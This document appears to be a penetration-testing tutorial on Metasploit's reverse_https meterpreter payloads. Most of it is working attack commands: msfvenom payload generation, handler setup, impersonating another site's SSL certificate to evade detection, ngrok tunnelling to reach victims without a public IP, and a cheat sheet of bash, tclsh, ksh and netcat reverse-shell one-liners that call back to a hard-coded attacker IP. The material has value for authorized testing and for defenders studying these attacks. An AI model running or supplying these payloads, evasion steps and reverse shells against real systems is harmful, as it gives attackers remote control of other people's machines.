### Troubleshooting and Using `reverse_https` in Metasploit

When using the `reverse_tcp_rc4` stager, we encountered an error message: "Unknown command." This issue arose because the stager could not decrypt `metsrv.dll` in memory. As a result, it failed to perform reflective DLL injection, causing the session to terminate after a few seconds.

**Important Note:** If decryption fails, the stager executed on the target server will drain CPU and memory resources. Therefore, be cautious when using `reverse_tcp_rc4`.

Instead of using a TCP-based stager, Metasploit offers the option to use a stager with SSL support: `reverse_https`.

### Using `reverse_https`

The `reverse_tcp` payload in Metasploit is powerful but has the drawback of being unencrypted for the second stage. However, Metasploit provides the `reverse_https` payload, which uses SSL for encryption.

#### Generating the Payload

To generate the `reverse_https` payload, use the following command:
```bash
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.6 lport=8443 -f exe -o Sha
```

#### Setting Up the Handler

Next, set up the handler with the following commands:
```bash
set payload windows/meterpreter/reverse_https
set lhost 192.168.2.6
set lport 8443
set exitfunc thread
set exitonsession false
run
```

After setting up the handler, execute the payload on the target server. The network packets will flow from the target server to the handler, and a meterpreter session will be established with a unique UUID.

### Analyzing SSL Traffic

Since `reverse_https` uses SSL, the network packets need to be decoded as SSL. This can be done in Wireshark by opening the "Analyze" > "Decode As..." sub-menu and adding the SSL option. Set the TCP port to 8443 and the type to SSL.

Once the SSL packets are decoded, you can search for the "Server Hello" packet to find the default SSL certificate used by the `reverse_https` payload. You can also verify the SSL certificate in the browser.

### Custom SSL Certificates

To avoid detection, use a custom SSL certificate. This can be done in two ways:

1. **Genuine SSL Certificate:** Purchase a genuine SSL certificate from an authorized seller or use services like Let's Encrypt.
2. **Impersonation:** Use someone else's SSL certificate. Metasploit provides a module for this: `auxiliary/gather/impersonate_ssl`.

#### Impersonating an SSL Certificate

Use the following commands to impersonate an SSL certificate:
```bash
use auxiliary/gather/impersonate_ssl
set ADD_CN *.packtpub.com
set EXPIRATION <expiration_date>
set rhost www.packtpub.com
set rport 443
run
```

Upon successful execution, three files will be generated: a private key file (.key), a certificate file (.crt), and a public certificate file (.pem). Use the PEM file to generate the HTTPS payload:
```bash
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.6 lport=8443 handlersslcert=<path_to_pem> stagerverifysslcert=true -f exe -o <output_file>
```

Set up the handler to use the impersonated SSL certificate:
```bash
set payload windows/meterpreter/reverse_https
set stagerverifysslcert true
set handlersslcert <path_to_pem>
run
```

### Meterpreter Session Hijacking

Meterpreter payloads can be hijacked by others. To prevent this, use the "paranoid mode," which verifies the SSL certificate using SHA1 and checks the UUID from the `payloads.json` file.

### Using ngrok for Meterpreter

If you don't have a public-facing IP, use ngrok to expose your local server to the internet. Register for ngrok and get the auth token. Use the following commands to start the HTTP tunnel:
```bash
./ngrok authtoken <your_auth_token>
./ngrok http 8443
```

Set up the handler to accept connections:
```bash
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 8443
set exitfunc thread
exploit -j
```

Generate the meterpreter payload to connect to the ngrok server:
```bash
msfvenom -p windows/meterpreter/reverse_http lhost=<ngrok_public_url> lport=80 -f exe -o <output_file>
```

### Reverse Shell Cheat Sheet

Here are some reverse shell one-liners for various shells:

#### Bash Reverse Shell
- **Using custom file descriptor:**
  ```bash
  exec 100<>/dev/tcp/192.168.2.6/8080; while read line; do $line 2>&100 >&100; done
  ```
- **Using interactive mode:**
  ```bash
  bash -i >& /dev/tcp/192.168.2.6/8080 0>&1
  ```

#### TCLsh/Wish Reverse Shell
```tcl
echo 'set s [socket 192.168.2.6 8080];while 100 { puts -nonewline $s "RevShell";flush $s;gets $s cmd;eval $cmd }' | tclsh
```

#### Ksh Reverse Shell
```ksh
ksh -c 'ksh >/dev/tcp/192.168.2.6/8080 0>&1'
```

#### Netcat Reverse Shell
- **Without GAPING_SECURITY_HOLE (using mkfifo):**
  ```bash
  rm -f /tmp/a; mkfifo /tmp/a; nc 192.168.2.6 8080 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a
  ```
- **With GAPING_SECURITY_HOLE:**
  ```bash
  nc 192.168.2.6 8080 -e /bin/sh
  ```

Use these techniques carefully and responsibly.